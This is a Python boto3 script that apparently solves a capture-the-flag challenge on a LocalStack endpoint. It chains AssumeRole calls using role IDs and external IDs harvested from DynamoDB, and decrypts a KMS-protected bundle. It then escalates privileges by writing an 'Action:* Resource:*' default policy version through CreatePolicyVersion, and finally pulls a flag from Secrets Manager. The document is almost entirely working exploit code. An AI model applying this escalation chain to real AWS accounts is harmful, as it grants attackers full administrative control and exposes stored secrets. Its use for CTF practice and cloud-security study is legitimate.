import boto3, json, time, sys
EP='http://154.57.164.81:31129'
# credentials for the per-instance LocalStack challenge (torn down after solve; replace with your own)
AK='[REDACTED]'; SK='[REDACTED]'
def base():
    return dict(endpoint_url=EP, region_name='us-east-1', aws_access_key_id=AK, aws_secret_access_key=SK)
def clc(svc, creds):
    kw=dict(endpoint_url=EP, region_name='us-east-1', aws_access_key_id=creds['AccessKeyId'],
            aws_secret_access_key=creds['SecretAccessKey'], aws_session_token=creds['SessionToken'])
    return boto3.client(svc, **kw)
sts0=boto3.client('sts', **base())
ident=sts0.get_caller_identity(); ACC=ident['Account']
print('[*] account', ACC, 'user', ident['Arn'])

# 1) subscribe notify-queue to unlock topic
sns=boto3.client('sns', **base()); sqs=boto3.client('sqs', **base())
topics={t['TopicArn'].split(':')[-1]:t['TopicArn'] for t in sns.list_topics()['Topics']}
print('[*] topics:', list(topics))
qurl=f'{EP}/{ACC}/registry-plate-notify-queue'
qarn=f'arn:aws:sqs:us-east-1:{ACC}:registry-plate-notify-queue'
sns.subscribe(TopicArn=topics['registry-plate-unlock'], Protocol='sqs', Endpoint=qarn)
print('[*] subscribed notify-queue to registry-plate-unlock')

# 2) collect unlock notices, find ACTIVE plate
dyn=boto3.client('dynamodb', **base())
active=None; end=time.time()+120
seen=set()
while time.time()<end and not active:
    r=sqs.receive_message(QueueUrl=qurl, MaxNumberOfMessages=10, WaitTimeSeconds=5, VisibilityTimeout=1)
    for m in r.get('Messages',[]):
        if m['MessageId'] in seen: continue
        seen.add(m['MessageId'])
        try:
            body=json.loads(m['Body']); inner=json.loads(body['Message']) if 'Message' in body else body
        except: continue
        if inner.get('status')=='ACTIVE':
            active=inner['plate_id']; print('[+] ACTIVE plate:', active); break
if not active:
    print('[-] no ACTIVE plate seen'); sys.exit(1)

# 3) read live plate record
it=dyn.get_item(TableName='registry-plate-index', Key={'plate_id':{'S':active}})['Item']
rec={k:list(v.values())[0] for k,v in it.items()}
print('[+] live record:', json.dumps(rec, indent=2))
roles={
  'custody': (rec['custody_role_arn'].split('/')[-1], rec['custody_external_id']),
  'indexer': (rec['indexer_role_arn'].split('/')[-1], rec['indexer_external_id']),
  'verifier': (rec['verifier_role_arn'].split('/')[-1], rec['verifier_external_id']),
  'custodian': (rec['custodian_role_arn'].split('/')[-1], rec['custodian_external_id']),
}
CHAIN=[roles['custody'], roles['indexer'], roles['verifier'], roles['custodian']]
print('[*] chain:', CHAIN)

# 4) walk chain
def walk(upto):
    creds=None; got={}
    src=sts0
    for role,ext in CHAIN[:upto]:
        creds=src.assume_role(RoleArn=f'arn:aws:iam::{ACC}:role/{role}',RoleSessionName='sess',ExternalId=ext)['Credentials']
        got[role]=creds
        src=clc('sts',creds)
    return creds, got

# 5) custody-reader reads+decrypts bundle -> ShardReaderPolicy
cust_creds,_=walk(1)
s3=boto3.client('s3', endpoint_url=EP, region_name='us-east-1', aws_access_key_id=cust_creds['AccessKeyId'],
                aws_secret_access_key=cust_creds['SecretAccessKey'], aws_session_token=cust_creds['SessionToken'],
                config=boto3.session.Config(s3={'addressing_style':'path'}))
kms_c=clc('kms',cust_creds)
blob=s3.get_object(Bucket=rec['artifacts_bucket'], Key=rec['policy_bundle_key'])['Body'].read()
bundle=json.loads(kms_c.decrypt(CiphertextBlob=blob, KeyId=blob.decode().split(':')[2])['Plaintext'])
POLICY=bundle['managed_policy_arn']
print('[+] bundle -> policy', POLICY)

# 6) indexer escalates ShardReaderPolicy via CreatePolicyVersion (Action:*)
idx_creds,_=walk(2)
iam=clc('iam', idx_creds)
newdoc=json.dumps({"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]})
iam.create_policy_version(PolicyArn=POLICY, PolicyDocument=newdoc, SetAsDefault=True)
print('[+] created admin policy version on', POLICY)

# 7) shard-custodian reads secret + decrypts -> FLAG
final_creds,_=walk(4)
sm=clc('secretsmanager', final_creds); kms_f=clc('kms', final_creds)
# find the shard secret name
secname=f'registry/shard/live-shard-{active.split("-")[-1].lower()}'
val=sm.get_secret_value(SecretId=secname)
raw=val.get('SecretBinary') or (val.get('SecretString') or '').encode()
if raw.startswith(b'kms:'):
    flag=kms_f.decrypt(CiphertextBlob=raw, KeyId=raw.decode().split(':')[2])['Plaintext'].decode()
else:
    flag=raw.decode()
print('\n[+++] FLAG:', flag)
